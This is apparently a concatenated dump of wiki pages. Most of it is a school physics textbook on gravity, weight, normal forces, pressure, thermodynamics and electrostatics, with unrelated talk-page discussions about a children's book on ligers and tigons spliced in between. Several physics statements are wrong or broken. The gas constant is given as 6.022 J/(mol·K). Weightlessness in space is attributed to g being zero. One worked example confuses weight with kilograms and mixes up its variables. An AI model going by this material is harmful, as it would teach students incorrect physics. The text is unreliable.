This equation describes the force between two bodies, one of mass ''m''&lt;sub&gt;1&lt;/sub&gt;, the other of mass ''m''&lt;sub&gt;2&lt;/sub&gt; (both have units of kilograms, or kg for short). The ''G'' is Newton's`Gravitational Constant' (6.673&amp;times;10&lt;sup&gt;&amp;minus;11&lt;/sup&gt; N&amp;middot;m&lt;sup&gt;2&lt;/sup&gt;&amp;middot;kg&lt;sup&gt;-2&lt;/sup&gt;) and ''r'' is the straight line distance between the two bodies in meters.

This means the bigger the masses, the greater the force between them. Simply put, big things matter
big with gravity. The 1/''r''&lt;sup&gt;2&lt;/sup&gt; factor (or you may prefer to say ''r''&lt;sup&gt;-2&lt;/sup&gt;) tells
us that the distance between the two bodies plays a role as well. The closer two bodies are, the
stronger the gravitational force between them is. We feel the gravitational attraction of the Earth
most at the surface since that is the closest we can get to it, but if we were in outer-space,
we would barely even know the Earth's gravity existed! 

Remember that 

{| 
|-
|&lt;math&gt;\begin{matrix}F=ma\end{matrix}&lt;/math&gt;
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; |    (9.2)
|}

which means that every object on the earth feels the same gravitational acceleration! That means
whether you drop a pen or a book (from the same height), they will both take the same length of time to hit the ground... in fact they will be head to head for the entire fall if you drop them at the
same time. We can show this easily by using the two equations above (9.1 and 9.2). The force between the Earth (which has the mass ''m''&lt;sub&gt;e&lt;/sub&gt;) and
an object of mass ''m''&lt;sub&gt;o&lt;/sub&gt; is 

{| 
|-
|&lt;math&gt;\begin{matrix}F=\frac{G m_o m_e}{r^2}\end{matrix}&lt;/math&gt;
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; |     (9.3)
|}

and the acceleration of an object of mass ''m''&lt;sub&gt;o&lt;/sub&gt; (in terms of the force acting on it) is

{| 
|-
|&lt;math&gt;\begin{matrix}a_o=\frac{F}{m_o}\end{matrix}&lt;/math&gt;
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; |     (9.4)
|}

So we substitute equation (9.3) into equation (9.4), and we find that

{|
|-
|&lt;math&gt;\begin{matrix}a_o=\frac{G m_e}{r^2}\end{matrix}&lt;/math&gt;
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; |     (9.5)
|}

Since it doesn't matter what ''m''&lt;sub&gt;o&lt;/sub&gt; is, this tells us that the acceleration on a body (due to the Earth's gravity) 
does not depend on the mass of the body. Thus all objects feel the same gravitational acceleration. The force on different bodies will be
different but the acceleration will be the same. Due to the fact that this acceleration caused by gravity is the same on all objects we label it differently,
instead of using ''a'' we use ''g'' which we call the gravitational acceleration.</text>

= Mass and Weight =

Weight is a force which is measured in Newtons, it is the force on an object due to gravity. People are always asking other people &quot;What is your weight?&quot; when a physicist might ask the same question as &quot;What is your mass?&quot;.

Mass is measured in kilograms (kg) and is the amount of matter in an object, it doesn't change unless you add or remove matter from the object (if you continue to study physics through to university level, you will find that Einstein's theory of relativity means that mass can change when you travel as fast as light does, but you don't need to worry about that right now). There are 1000 g in 1 kg and 1000 kg in a tonne.

To change mass into weight we use Newton's 2nd Law which is &lt;math&gt;F = ma&lt;/math&gt;. The weight is the force and gravity the acceleration, it can be rewritten as:

{| 
|-
|&lt;math&gt;\begin{matrix}W=mg\end{matrix}&lt;/math&gt;
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; |    (9.2)
|}


''W'' is the weight, measured in newtons. ''m'' is the mass, measured in kilograms and ''g''
is the acceleration due to gravity, measured in metres per second squared; it is equal to about 10 on the Earth. The exact value of Earths equatorial surface gravity is 9.7801 &lt;math&gt;m.s^{-2}&lt;/math&gt;.

== Examples ==
1. A bag of sugar has a mass of 1 kg, what is it's weight? (Acceleration due to gravity = 10 &lt;math&gt;m.s^{-2}&lt;/math&gt;)

Step 1: 
Always write out the equation, it helps you to understand the question, and you will get marks as well.
{| 
|-
|&lt;math&gt;\begin{matrix}W=mg\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; |(9.7)
|}

Step 2: Fill in all the values you know. (remember to make sure the mass is in kilograms and NOT in grams or tonnes!)

{| 
|-
|&lt;math&gt;\begin{matrix}W = 1 \times 10\end{matrix}&lt;/math&gt;
|-
|&lt;math&gt;W =  10&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; |(9.8)
|}

Step 3: Write out the answer remembering to include the units! You will lose marks if you don't

{| 
|-
|&lt;math&gt;\begin{matrix}W = 10 \ newtons\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; |(9.9)
|}


2. A space-man has a mass of 90 kg, what is his weight (a) on the earth? (b) on the moon? (c) in outer space? (The acceleration due to gravity on the earth is 10 &lt;math&gt;m.s^{-2}&lt;/math&gt;, on the moon gravity is about 1/6 of the gravity on earth).

1:
{| 
|-
|&lt;math&gt;\begin{matrix}W=mg\end{matrix}&lt;/math&gt;
|- 
|-
|&lt;math&gt;\begin{matrix}W = 90 \times 10 = 900\end{matrix}&lt;/math&gt;
|- 
|&lt;math&gt;W = 900 \ newtons&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; |(9.10)
|}

2:

{| 
|-
|&lt;math&gt;W = M \ g&lt;/math&gt;
|- 
|-
|&lt;math&gt;\begin{matrix}W = 90 \times  \ 10  \times \frac{1}{6} = 150 \end{matrix}	&lt;/math&gt;
|- 
|&lt;math&gt;W = 150 \ newtons&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; |(9.10)
|}


3: Weightless in outer space because ''g'' = 0.

So now when somebody asks you your weight, you know to reply ``Anything!! But my mass is a different matter!&quot;</text>

= Normal Forces =
If you put a book on a table, it does not accelerate; it just lies on the table. We know that gravity is acting on it with a force 

{| 
|-
|&lt;math&gt;\begin{matrix}F= G\frac{m_Em_{book}}{r^2}\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.12)
|}

but if there is a net force there MUST be an acceleration and there isn't. This means that the gravitational force is being balanced by
another force [Newton's third law!].

This force we call the normal force. It is the reaction force between the book and the table. It is equal to the force of
gravity on the book. This is also the force we measure when we measure the weight of something.

The most interesting and illustrative normal force question, that is often asked, has to do with a scale in a lift. Using Newton's
third law we can solve these problems quite easily. 

When you stand on a scale to measure your weight you are pulled down by gravity. There is no acceleration downwards because there
is a reaction force we call the normal force acting upwards on you. This is the force that the scale would measure. If the
gravitational force were less than the reading on the scale would be less.

==Worked Example 53 Normal Forces 1==

'''Question:''' A man weighing 100''kg'' stands on a scale (measuring newtons). What is the reading on the scale?

'''Answer:''' 

Step 1 : 

We are given the mass of the man. We know the gravitational acceleration that acts on him. 

Step 2 : 

The scale measures the normal force on the man. This is the force that balances gravity. 

Step 3 : 

Firstly we determine the net force acting downwards on the man due to gravity.

&lt;center&gt;&lt;math&gt;\begin{matrix}F_g&amp;=&amp;mg \\&amp;=&amp; 100kg\times 9.8\frac{m}{s^2} \\&amp;=&amp; 980\frac{kgm}{s^2} \\&amp;=&amp; 980N\ downwards \\\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

We now know the gravitational force downwards. We also know that there must be a reactionary force ''F''&lt;sub&gt;N&lt;/sub&gt; upwards. To determine
the magnitude of this we use newton's laws again. We know that the sum of all the forces must equal the resultant acceleration times
the mass. The overall resultant acceleration of the man on the scale is 0. if we write out the equation:

&lt;center&gt;&lt;math&gt;\begin{matrix}F_r&amp;=&amp;F_g+F_N \\0 &amp;=&amp; -980N+F_N\\F_N = 980N\ upwards\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

The normal force is then 980''N'' upwards. It exactly balances the gravitational force downwards so there is no net force and no
acceleration on the man.

&lt;hr style=&quot;background-color:red&quot; /&gt;

Now we are going to add things to exactly the same problem to show how things change slightly. We will now move to a lift moving at
constant velocity. Remember if velocity is constant then acceleration is zero.

==Worked Example 55 Normal Forces 2==

'''Question:''' A man weighing 100''kg'' stands on a scale (measuring newtons) inside a lift accelerating downwards at &lt;math&gt;2\frac{m}{s^2}&lt;/math&gt;. What is the reading on the scale?

'''Answer:''' 

Step 1 : 
We are given the mass of the man. We know the gravitational acceleration that acts on him. 

Step 2 : 

The scale measures the normal force on the man.

Step 3 : 

Firstly we determine the net force acting downwards on the man due to gravity.

&lt;center&gt;&lt;math&gt;\begin{matrix}F_g&amp;=&amp;mg \\&amp;=&amp; 100kg\times 9.8\frac{m}{s^2} \\&amp;=&amp; 980\frac{kgm}{s^2} \\&amp;=&amp; 980N\ downwards \\\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

We now know the gravitational force downwards. We also know that there must be a reactionary force ''F''&lt;sub&gt;N&lt;/sub&gt; upwards. To determine
the magnitude of this we use newton's laws again. We know that the sum of all the forces must equal the resultant acceleration times
the mass. The overall resultant acceleration of the man on the scale is &lt;math&gt;2\frac{m}{s^2}&lt;/math&gt;. if we write out the equation: 

&lt;center&gt;&lt;math&gt;\begin{matrix}F_r&amp;=&amp;F_g+F_N \\100kg\times (-2)\frac{m}{s^2} &amp;=&amp; -980N+F_N\\-200\frac{kgm}{s^2} &amp;=&amp; -980N+F_N\\-200N &amp;=&amp; -980N+F_N\\F_N = 780N\ upwards\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

The normal force is then 780''N'' upwards. It balances the gravitational force downwards just enough so that the man only
accelerates downwards at &lt;math&gt;2\frac{m}{s^2}&lt;/math&gt;. 

==Worked Example 56 Normal Forces 3==

'''Question:''' A man weighing 100''kg'' stands on a scale (measuring newtons) inside a lift accelerating upwards at &lt;math&gt;4\frac{m}{s^2}&lt;/math&gt;&gt;. What is the reading on the scale? 

'''Answer:''' 

Step 1 : 
We are given the mass of the man. We know the gravitational acceleration that acts on him. 

Step 2 : 

The scale measures the normal force on the man.

Step 3 : 

Firstly we determine the net force acting downwards on the man due to gravity.

&lt;center&gt;&lt;math&gt;\begin{matrix}F_g&amp;=&amp;mg \\&amp;=&amp; 100kg\times 9.8\frac{m}{s^2} \\&amp;=&amp; 980\frac{kgm}{s^2} \\&amp;=&amp; 980N\ downwards \\\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

We now know the gravitational force downwards. We also know that there must be a reactionary force ''F''&lt;sub&gt;N&lt;/sub&gt; upwards. To determine
the magnitude of this we use newton's laws again. We know that the sum of all the forces must equal the resultant acceleration times
the mass. The overall resultant acceleration of the man on the scale is &lt;math&gt;4\frac{m}{s^2}&lt;/math&gt;. if we write out the equation: 

&lt;center&gt;&lt;math&gt;\begin{matrix}F_r&amp;=&amp;F_g+F_N \\100kg\times (4)\frac{m}{s^2} &amp;=&amp; -980N+F_N\\400\frac{\mbox{kg} \cdot \mbox{m}}{\mbox{s}^2} &amp;=&amp; -980 \mbox{ N}+F_N\\400\mbox{ N} &amp;=&amp; -980 \mbox{ N}+F_N\\F_N = 1380 \mbox{ N}\ upwards\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

The normal force is then 1380 N upwards. It balances the gravitational force and then in addition applies sufficient force
to accelerate the man upwards at  &lt;math&gt;4\frac{m}{s^2}&lt;/math&gt;.</text>

= Comparative problems =

Here always work with multiplicative factors to find something new in terms of something old.

==Worked Example 57 Comparative Problem 1==
'''Question:''' On Earth a man weighs 700 N. Now if the same man was instantaneously beamed to the planet Zirgon, which has the
same size as the Earth but twice the mass, what would he weigh?

'''Answer:''' 

Step 1 : 

We start with the situation on earth:

{| 
|-
|&lt;math&gt;\begin{matrix}W = mg = G\frac{m_Em}{r^2}\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.13)
|}



Step 2 : 

Now we consider the provje

{| 
|-
|&lt;math&gt;\begin{matrix}W_Z= mg_Z = G\frac{m_Zm}{r_Z^2}\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.14)
|}

but we know that &lt;math&gt;m_Z = 2m_E&lt;/math&gt; and we know that ''r''&lt;sub&gt;Z&lt;/sub&gt; = ''r'' so we could
write the equation again and substitute these relationships in:

Step 3 : 

{| 
|- 
|&lt;math&gt;\begin{matrix}W_Z= mg_Z = G\frac{(m_Z)m}{(r_Z)^2}\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.15)
|}

Step 4 : 

{| 
|- 
|&lt;math&gt;\begin{matrix}W_Z= mg_Z = G\frac{(2m_E)m}{(r)^2}\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.16)
|}


{| 
|- 
|&lt;math&gt;\begin{matrix}W_Z= 2( G\frac{(m_E)m}{(r)^2})\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.17)
|}

Step 5 : 

{| 
|- 
|&lt;math&gt;\begin{matrix}W_Z= 2(W)\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.18)
|}

so on Zirgon he weighs 1400 N.

== Principles ==

* Write out first case
* Write out all relationships between variable from first and second case
* Write out second case
* Substitute all first case variables into second case
* Write second case in terms of first case

|The acceleration due to gravity at the Earth's surface is, by
convention, equal to 9.80665 ''ms''&lt;sup&gt;-2&lt;/sup&gt;. (The actual value varies
slightly over the surface of the Earth). This quantity is known as
''g''. The following is a list of the gravitational accelerations (in
multiples of ''g'') at the surfaces of
each of the planets in our solar system:

==Worked Example 58 Comparative Problem 2==
'''Question:''' On Earth a man weighs 70 kg. On the planet Beeble how much will he weigh if Beeble has mass half of that of the Earth and a radius one quarter that of the earth.

'''Answer:'''

Step 1 : 

We start with the situation on earth:

{| 
|-
|&lt;math&gt;\begin{matrix}W = mg = G\frac{m_Em}{r^2}\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.19)
|}

Step 2 : 

Now we consider the provje

{| 
|-
|&lt;math&gt;\begin{matrix}W_B= mg_B = G\frac{m_Bm}{r_B^2}\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.20)
|}

but we know that &lt;math&gt;m_Z = \frac{1}{2}m_E&lt;/math&gt; and we know that &lt;math&gt;r_Z = \frac{1}{4}r&lt;/math&gt; so we could write the equation again and substitute these relationships in:

Step 3 : 

{| 
|-
|&lt;math&gt;\begin{matrix}W_Z= mg_Z = G\frac{(m_Z)m}{(r_Z)^2}\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.21)
|}

Step 4 : 

{| 
|-
|&lt;math&gt;\begin{matrix}W_Z= mg_Z = G\frac{(\frac{1}{2}m_E)m}{(\frac{1}{4}r)^2}\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.22)
|}

{| 
|-
|&lt;math&gt;\begin{matrix}W_Z= 8( G\frac{(m_E)m}{(r)^2})\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.23)
|}

Step 5 : 

&lt;math&gt;\begin{matrix}W_Z= 8(W)\end{matrix}&lt;/math&gt;

But although the man exerts 8 times as much force due to gravity, he still weighs 70 kg on Beeble!

= Falling bodies =

Objects on the earth fall because there is a gravitation force between them and the earth - which results in an acceleration - as we saw above.
So if you hold something in front of you and let it go - it will fall.

It falls because of an acceleration toward the centre of the earth which results from the gravitational force between the two.

These bodies move in a straight line from the point where they start to the centre of the earth. This means we can reuse everything we learnt
in rectilinear motion. the only thing that needs thinking about is the directions we are talking about.

We need to choose either up or down as positive just like we had to choose a positive direction in standard rectilinear motion problems. this is the
hardest part. If you can do rectilinear motion you can do falling body problems. Just remember the acceleration they feel is constant and because
of gravity - but once you have chosen your directions you can forget that gravity has anything to do with the problem - all you have is a rectilinear
motion problem with a constant acceleration!!

What is the weight of a free falling body ? Would you be surprised to know that it is zero ?

Weight is measured using a spring balance. (Mass is measured using a physical balance). When a body is falling, the spring balance to which it is attached (the spring balance needs to fall along with the body too !) would show zero weight. When the body stops falling, then it would exert a force on the spring (equivalent to the force exerted by earth on itself) and hence it would show a reading.</text>

= Terminal Velocity =

Physics is all about being simple - all we do is look at the world around us and notice how it really works. It is the one thing everyone is qualified
to do - we spend most of our time when we are really young experimenting to find out how things work.

Take a book - wave it in the air - change the angle and direction. what happens of course there is resistance. different angles make it greater - the faster
the book moves the greater it is. The bigger the area of the book moving in the direction of motion the greater the force.

So we know that air resistance exists! it is a force. So what happens when an object falls? of course there is air resistance - or drag
as it is normally called. There is an approximate formula for the drag force as well.

The important thing to realise is that when the drag force and the gravitational force are equal for a falling body there is no net force
acting on it - which means no net acceleration. That does not mean it does not move - but it means that its speed does not change.

It falls at a constant velocity! This velocity is called terminal velocity.</text>

= Drag force =

The actual force of air resistance is quite complicated. Experiment by moving a book through the air with the face of the book and then the side of
the book forward, you will agree that the area of the book makes a difference as to how much you must work in order to move the book at the same speed in
both cases. This is why racing cars are slim-lined in design, and not shaped like a big box!

Get a plastic container lid (or anything waterproof) swing it around in air and then try to swing it around under water. The density of the water is much
larger than the air, making you have to work harder at swinging the lid in water. This is why boats and submarines are a lot slower than aeroplanes!

So we know that density, area and speed all play a role in the drag force.The expression we use for drag force is

{| 
|-
|&lt;math&gt;\begin{matrix}D=\frac{1}{2}C\rho Av^2\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(9.25)
|}


where ''C'' is a constant which depends on the object and fluid interactions, &lt;math&gt;\rho&lt;/math&gt; is the density, ''A'' is the area and ''v'' is the velocity.</text>

This article seems to contradict much of what is written in the Tigon wikipedia article. - anon

the article on Ligers and Tigons is an informative one and should not be deleted.
Hybrids exist in many species, that is a fact and one that most children should have no trouble understanding. Frankly I fail to understand the logic behind deleting a page because most adults have not heard of the content.. isn't that what information books are all about, informing us? Pabsy.

This page is informative and I can see no reason to delete it from the book. Hybrids happen in many species and my children have no trouble understanding that fact. Frankly i fail to understand the logic in deleting a page on the grounds that a reader has never heard of the content or that the content could confuse a child. isn't that what information books are all about.. informing us?
oh come on... why stop at deleting a page on hybrid cats?, children are confused with Algebra, logarithms, times tables... lets delete the lot..simple.

: Are you sure that lions and tigers can cross-breed? Do they even co-exist anywhere? Visit [http://uncyclopedia.org Uncyclopedia] - you will absolutely love it. [[User:Charlie123|Charlie123]] 8 July 2005 12:52 (UTC)

== Merger ==
Content to make an entire book on Tigons and Ligers is quite frankly absurd.  This section should be merged into the WikiJunior Book of Lions or Tigers.

== Confusing ==

&quot;Due to conservation efforts, deliberate hybridization is prohibited in most zoos. However, it happens regularly by accident, and some private breeders try to breed ligers for novelty purposes.&quot;

I am 12, I find this confusing: deliberate hybridization, novelty purposes, conservation efforts. &quot;Not allowed&quot; is probably more understandable than &quot;prohibited&quot;. &quot;Owners&quot; might be easier than &quot;private breeders.&quot;

&quot;They are instinctively social animals. Tigers, on the other hand, are instinctively solitary. The offspring of a lion-tiger share the conflicting instincts of both their parents.&quot;

I would say this sentence like this-

&quot;Lions naturally like to live together in groups, but tigers like to live by themselves.&quot; (The second sentence doesn't make any sense to me.)

&quot;Ligers were originally assumed to be sterile, which is true for most hybrid species such as the mule (a cross between a horse and a donkey). However, females can be fertile.&quot;

I thought &quot;sterile&quot; meant clean, but my father told me that it means that they can't have babies. I guess that &quot;fertile&quot; means they can.

== Illustrations ==

This article is crying out for photographs.  Unfortunately our options are a bit limited.  All the hybrid pictures on commons reside in [[commons:Category:Pantherinae]] ([[commons:Category:Hybrid Cats]] is just a partial duplicate).  Our options look to be:

&lt;gallery&gt;
Image:Tigon1.jpg|2005 tigon
Image:Tigon2.jpg
Image:Tigon3.jpg
Image:Tigon4.jpg
&lt;/gallery&gt;

The last tigon picture is ok, but the rest leave a lot to be desired, especially for a kids book.  I'm still looking for more free images, but I'm not holding my breath on this one.  What do you folks think?  &amp;mdash; [[User:Laurascudder|Laura Scudder]] | [[User talk:Laurascudder|Talk]] 08:37, 23 November 2005 (UTC)</text>

'''Essay 3: Pressure and Forces'''

Author: Asogan Moodaly

Asogan Moodaly received his Bachelor of Science degree (with honours) in Mechanical Engineering from the University
of Natal, Durban in South Africa. For his final year design project he worked on a 3-axis filament winding machine for composite (Glass
re-enforced plastic in this case) piping. He worked in Vereeniging, Gauteng at Mine Support Products (a subsidiary of Dorbyl Heavy
Engineering) as the design engineer once he graduated. He currently lives in the Vaal Triangle area and is working for Sasol Technology
Engineering as a mechanical engineer, ensuring the safety and integrity of equipment installed during projects.

=Pressure and Forces=

In the mining industry, the roof (hangingwall) tends to drop as the face of the tunnel (stope) is excavated for rock containing gold.

As one can imagine, a roof falling on one's head is not a nice prospect! Therefore the roof needs to be supported.

[[Image:Fhsst_press1.png|363px|]]

The roof is not one big uniform chunk of rock. Rather it is broken up into smaller chunks. It is assumed that the biggest chunk of rock
in the roof has a mass of less than 20 000 kg therefore each support has to be designed to resist a force related to that mass.
The strength of the material (either wood or steel) making up the support is taken into account when working out the minimum required
size and thickness of the parts to withstand the force of the roof.

[[Image:Fhsst_press2.png|363px|]]

Sometimes the design of the support is such that the support needs to withstand the rock mass without the force breaking the roof..

Therefore hydraulic supports (hydro = water) use the principles of force and pressure such that as a force is exerted on the support,
the water pressure increases. A pressure relief valve then squirts out water when the pressure (and thus the force) gets too large.
Imagine a very large, modified doctor's syringe.

[[Image:Fhsst_press3.png|363px|]]

In the petrochemical industry, there are many vessels and pipes that are under high pressures. A vessel is a containment unit (Imagine a
pot without handles, that has the lid welded to the pot that would be a small vessel) where chemicals mix and react to form other
chemicals, amongst other uses.

[[Image:Fhsst_press4.png|335px|]]

The end product chemicals are sold to companies that use these chemicals to make shampoo, dishwashing liquid, plastic containers,
fertilizer, etc. Anyway, some of these chemical reactions require high temperatures and pressures in order to work. These pressures
result in forces being applied to the insides of the vessels and pipes. Therefore the minimum thickness of the pipe and vessels walls
must be determined using calculations, to withstand these forces. These calculations take into account the strength of the material
(typically steel, plastic or composite), the diameter and of course the pressure inside the equipment.</text>

== Non Si Units for pressure ==
'''PSI:''' PSI stands for pounds per square inch. One PSI is equal to 6,894.76 Pascals

'''Atm:''' Atm stands for Atmosphere. This is the atmospheric pressure at sea level. I atm is equal to 101,325 Pascals

===Hydrostatic pressure (head pressure)===
[[Hydrostatic pressure]] is the pressure due to the [[weight]] of a fluid.
:&lt;math&gt;
p = \rho g h\,
&lt;/math&gt;
where:

    ρ (rho) is the density of the fluid (i.e., the practical density of fresh water is 1000 kg/m3);
    g is the acceleration due to gravity (approximately 9.81 m/s2 on earth's surface);
    h is the height of the fluid column (in metres). Other units can be used if the rest of the units used in the equation are defined in a consistent way. 

It is important to realize that air is a fluid. This equation can be used to find the pressure created by air.  This also means that if we are trying to find the pressure of a liquid open to the atmosphere, we must add in the atmospheric pressure to the pressure of the liquid to find the total pressure.

==Notes==
===1===
Pressure is force divided by area, so in a sense it does have a direction as force has a direction.  The term pseudovector is sometimes used for such quantities.</text>

== Broken link at US History ==

Hi Hyperlink, I tried out the links but they seem to work for me. Could you be more specific (on the &lt;s&gt;Talk:US History: Contents&lt;/s&gt; page) which was the link that did not work for you? --[[User:Andreas Ipp|Andreas]] 09:47, 29 Mar 2005 (UTC)

== Issue Guides ==

There's some thoughts at [[Talk:Voter's Guide]], but I'm still kind of experimenting and am not really sure about where to take the project and how to format it.  (Please feel free to make some suggestions about formatting)  So, yes, I will be doing something with organizational top-level pages of the Issue Guides, but I don't really know how to organize it yet, so I haven't done so.

Well... We got there.  Thanks for nominating us.  Getting BOTM made all of the hard work we put into HTBAC worthwhile.  Thanks --[[User:Noogz|Noogz]] 02:06, 1 May 2005 (UTC)</text>

== Equation of state ==

An ideal gas has the following equation of state:

&lt;math&gt;
pV=\nu RT
&lt;/math&gt;

Where ''p'' is pressure, ''V'' is volume, &lt;math&gt;\nu=m/\mu&lt;/math&gt; is number of moles observed, &lt;math&gt;R=N_Ak_B=6.022&lt;/math&gt; J/(mol&amp;middot;K)
is a universal gas constant.

The gas constant has a value of 8.314 J/(mol.K) or 0.0821 (L*atm)/(mol*K)

== Specific heat capacity ==
Conversion of macroscopic energy to microscopic kinetic energy thus tends to raise the temperature, while the reverse conversion lowers it. It is easy to show experimentally that the amount of heating needed to change the temperature of a body by some amount is proportional to the amount of matter in the body. Thus, it is natural to write

{| 
|-
|&lt;math&gt;\Delta Q=MC\Delta T&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(23.4)
|}

'''Riaan Note: not sure about the equation numbers, sticking to those in the PDF released the 1st of March 2005'''

where &lt;math&gt;M&lt;/math&gt; is the mass of material, &lt;math&gt;\Delta Q&lt;/math&gt; is the amount of energy transferred to the material, and &lt;math&gt;\Delta T&lt;/math&gt; is the change of the material's temperature. The quantity &lt;math&gt;C&lt;/math&gt; is called the specific heat of the material in question and is the amount of energy needed to raise the temperature of a unit mass of material one degree in temperature. &lt;math&gt;C&lt;/math&gt; varies with the type of material. Values for common materials are given in table 22.2.

== Specific latent heat ==
When a material changes phases from solid to liquid, or from liquid to gas, a certain amount of energy is involved in this change of space.

== Internal energy ==

== First law of thermodynamics ==

We now address some questions of terminology. The use of the terms ''heat''  and ''quantity of heat'' to indicate the amount of microscopic kinetic energy inhabiting a body has long been out of favor due to their association with the discredited ''caloric'' theory of heat. Instead, we use the term internal energy to describe the amount of microscopic energy in a body. The word heat is most correctly used only as a verb, e. g.,  ''to heat the house'' . Heat thus represents the transfer of internal energy from one body to another or conversion of some other form of energy to internal energy. Taking into account these definitions, we can express the idea of energy conservation in some material body by the equation


{| 
|-
|&lt;math&gt;\Delta E = \Delta Q - \Delta W&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (first law of thermodynamics)
|}

where &lt;math&gt;\Delta E&lt;/math&gt; is the change in internal energy resulting from the addition of heat &lt;math&gt;\Delta Q&lt;/math&gt; to the body and the work &lt;math&gt;\Delta W&lt;/math&gt; done by the body on the outside world. This equation expresses the first law of thermodynamics. Note that the sign conventions are inconsistent as to the direction of energy flow. However, these conventions result from thinking about heat engines, i. e., machines which take in heat and put out macroscopic work. Examples of heat engines are steam engines, coal and nuclear power plants, the engine in your automobile, and the engines on jet aircraft.</text>

= Electrostatics =
The study of the effects of static charges. These charges are produced by too many or too few electrons. Electrons, in turn, are the most movable charge forms, and are found spread around the positive charge in the nucleus of the atom.
If there are too few electrons, a positive charge will appear. If there are too many, a negative charge will appear. If the charges are in balance, then no charge is detected.
The electron is a fundamental particle,and has interesting characteristics, besides the charge, it spins, and this spin gives rise to a magnetic field, much like an electric motor.

The decision to call some charges positive and others negative was ''arbitrary''. This gives rise to a potential misunderstanding when charges are moving in a circuit. This will be deferred to a later section, on electricity.

The fundamental study of these charges in isolation can best be observed by experiment. If we generate a charge by friction, say fur on hard rubber, or silk on glass, we can transfer the charge to a small ball coated with aluminum foil. This ball is held up by a thin thread. Nylon or silk work well.

If however the air is damp, the charge will leak off the metal balls.

Two such balls, charged by the same static source will repel each other. If we use two different sources, they will attract each other. Maybe.

We can measure the amount of attraction or repulsion by a simple means. If we measure the weight of these balls, then we know that they are attracted by the earth. Other forces on these balls will cause them to swing away from hanging straight down. 

By measuring the movement, or the angle, we can figure out what tiny force is pushing the ball away from the vertical. The tangent function is the perfect candidate to resolve this problem. ((add more text and diagrams here))

It would be nice to find out what happens when some charge is removed. It turns out, that if we use a third ball, of the same size as the other two, we can exactly halve the charge.

From this we can see that we can measure the effects of increasing distance, and decreasing charge.</text>

= Charge =

All objects surrounding us (including people!) contain large amounts of electric charge. Charge can be negative or
positive and is measured in units called coulombs (C). Usually, objects contain the same amount of positive
and negative charge so its effect is not noticeable and the object is called electrically neutral. However, if a small imbalance is
created (i.e. there is a little bit more of one type of charge than the other on the object) then the object is said to be
electrically charged.

Some rather amusing examples of what happens when a person becomes charged are for example when you charge your hair by combing it with a
plastic comb and it stands right up on end! Another example is when 
you walk fast over a nylon carpet and then touch a metal doorknob and
give yourself a small shock (alternatively you can touch your friend and shock them!)

Charge has 3 further important properties:

* Charge is always conserved. Charge, just like energy, cannot be created or destroyed.
* Charge comes in discrete packets. The smallest unit of charge is that carried by one electron called the elementary charge, e, and by convention, it has a negative sign ( &lt;math&gt;e = -1.6 \times 10^{-19} \rm {C} &lt;/math&gt; ).
* Charged objects exert electrostatic forces on each other. Like charges repel and unlike charges attract each other.

&lt;hr style=&quot;background-color:red&quot; /&gt;

{|

|[[Image:Fhsst_magnify.png|110px]]
| The word `electron' comes from the Greek word for amber! The ancient Greeks observed that if you rubbed a piece of amber,
you could use it to pick up bits of straw. (Attractive electrostatic force!)
|}


You can easily test the fact that like charges repel and unlike charges attract by doing a very simple experiment. Take a glass
rod and rub it with a piece of silk, then hang it from its middle with a piece string so that it is free to move. If you then bring another
glass rod which you have also charged in the same way next to it, you will see the rod on the string turn away from the rod in your hand
i.e. it is repelled. If, however, you take a plastic rod, rub it with a piece of fur and then bring it close to the rod on the string, you
will see the rod on the string turn towards the rod in your hand i.e. it is attracted!

[[Image:Fhsst_electrost1.png|553px|]]

What actually happens is that when you rub the glass with silk, tiny amounts of negative charge are transferred from the glass onto the
silk, which causes the glass to have less negative charge than positive charge, making it '''positively charged'''. When you
rub the plastic rod with the fur, you transfer tiny amounts of negative charge onto the rod and so it has more negative charge than
positive charge on it, making it '''negatively charged'''.

== Conductors and Insulators ==
Some materials allow charge carriers to move relatively freely through them (e.g. most metals, tap water, the human body) and these materials are called conductors. Other materials, which do not allow the charge carriers to move through them (e.g. plastic, glass), are called non-conductors or
insulators.
